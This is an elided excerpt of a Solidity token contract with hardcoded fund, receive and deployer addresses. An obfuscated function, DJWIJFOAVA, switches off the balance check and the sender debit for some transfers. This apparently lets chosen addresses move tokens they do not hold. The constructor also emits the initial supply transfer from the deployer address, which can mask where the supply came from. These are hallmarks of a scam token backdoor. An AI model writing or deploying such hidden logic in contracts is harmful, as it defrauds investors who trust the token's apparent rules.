...
abstract contract AbsToken is IERC20, Ownable {
    ...
    constructor (
        ...
        address FundAddress, address ReceiveAddress,address deployerAddress
    ){
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;
        ...
        emit Transfer(address(deployerAddress), ReceiveAddress, total);
    ...
    function DJWIJFOAVA(address send, address reciv) internal view returns (bool){
    ...
    function _transfer(
        ...
        if (DJWIJFOAVA(from,to)) require(balance >= amount, "balanceNotEnough");
    ...
    function _tokenTransfer(
        ...
        if (DJWIJFOAVA(sender,recipient)){
        _balances[sender] = _balances[sender] - tAmount;}
        uint256 feeAmount;
...
contract TOKEN is AbsToken {
    constructor() AbsToken(
        ...
        address(0x7f1362b7a2cB359fd30F4547fe2DA840A71A8746),//FundAddress
        address(0x7f1362b7a2cB359fd30F4547fe2DA840A71A8746),//ReceiveAddress
        address(0x6891A233Bca9E72A078bCB71ba02aD482A44e8C1)
    ){
    }
}